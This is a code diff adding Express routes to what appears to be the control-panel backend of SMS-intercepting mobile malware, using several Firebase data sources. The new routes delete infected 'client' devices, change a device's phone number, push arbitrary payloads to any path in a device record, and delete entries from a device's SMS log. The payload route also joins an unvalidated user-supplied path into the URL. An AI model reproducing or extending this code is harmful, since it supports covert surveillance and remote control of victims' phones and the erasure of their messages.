@@ -143,4 +143,96 @@ router.get('/messages/:src/:id', protect, async (req, res) => {
     }
 });
 
+// @route   DELETE /api/devices/:src/:id
+// @desc    Delete a specific device from Firebase
+// @access  Private
+router.delete('/devices/:src/:id', protect, async (req, res) => {
+    try {
+        const { src, id } = req.params;
+        const source = await Source.findOne({ key: src, $or: [{ owner: null }, { owner: req.user._id }] });
+        if (!source) return res.status(403).json({ success: false, message: 'Unauthorized source' });
+
+        const url = `${source.base}/clients/${id}.json${source.apiKey ? `?auth=${source.apiKey}` : ''}`;
+        const fRes = await fetch(url, { method: 'DELETE' });
+        
+        if (!fRes.ok) throw new Error('Firebase deletion failed');
+        res.json({ success: true, message: 'Device deleted' });
+    } catch (error) {
+        res.status(500).json({ success: false, message: 'Error deleting device' });
+    }
+});
+
+// @route   PUT /api/devices/:src/:id/phone
+// @desc    Manually edit a device's custom phone number
+// @access  Private (Admin or Authorized)
+router.put('/devices/:src/:id/phone', protect, async (req, res) => {
+    try {
+        const canEdit = req.user.role === 'admin' || req.user.permissions?.canEditPhone;
+        if (!canEdit) return res.status(403).json({ success: false, message: 'Access Denied: Missing M-Badge rights' });
+
+        const { src, id } = req.params;
+        const { customPh } = req.body;
+        
+        const source = await Source.findOne({ key: src, $or: [{ owner: null }, { owner: req.user._id }] });
+        if (!source) return res.status(403).json({ success: false, message: 'Unauthorized source' });
+
+        const url = `${source.base}/clients/${id}/customPh.json${source.apiKey ? `?auth=${source.apiKey}` : ''}`;
+        const fRes = await fetch(url, { 
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(customPh) 
+        });
+        
+        if (!fRes.ok) throw new Error('Firebase update failed');
+        res.json({ success: true, message: 'Number updated' });
+    } catch (error) {
+        res.status(500).json({ success: false, message: 'Error updating number' });
+    }
+});
+
+// @route   POST /api/execute/:src/:id
+// @desc    Push a payload to a device's specific path
+// @access  Private
+router.post('/execute/:src/:id', protect, async (req, res) => {
+    try {
+        const { src, id } = req.params;
+        const { path, payload } = req.body;
+        
+        const source = await Source.findOne({ key: src, $or: [{ owner: null }, { owner: req.user._id }] });
+        if (!source) return res.status(403).json({ success: false, message: 'Unauthorized source' });
+
+        const url = `${source.base}/clients/${id}${path}${source.apiKey ? `?auth=${source.apiKey}` : ''}`;
+        const fRes = await fetch(url, { 
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload) 
+        });
+        
+        if (!fRes.ok) throw new Error('Firebase payload failed');
+        res.json({ success: true, message: 'Payload dispatched' });
+    } catch (error) {
+        res.status(500).json({ success: false, message: 'Error dispatching payload' });
+    }
+});
+
+// @route   DELETE /api/messages/:src/:id/:msgId
+// @desc    Delete a specific SMS message
+// @access  Private
+router.delete('/messages/:src/:id/:msgId', protect, async (req, res) => {
+    try {
+        const { src, id, msgId } = req.params;
+        
+        const source = await Source.findOne({ key: src, $or: [{ owner: null }, { owner: req.user._id }] });
+        if (!source) return res.status(403).json({ success: false, message: 'Unauthorized source' });
+
+        const url = `${source.base}/clients/${id}/smsLog/${msgId}.json${source.apiKey ? `?auth=${source.apiKey}` : ''}`;
+        const fRes = await fetch(url, { method: 'DELETE' });
+        
+        if (!fRes.ok) throw new Error('Firebase deletion failed');
+        res.json({ success: true, message: 'Message deleted' });
+    } catch (error) {
+        res.status(500).json({ success: false, message: 'Error deleting message' });
+    }
+});
+
 module.exports = router;
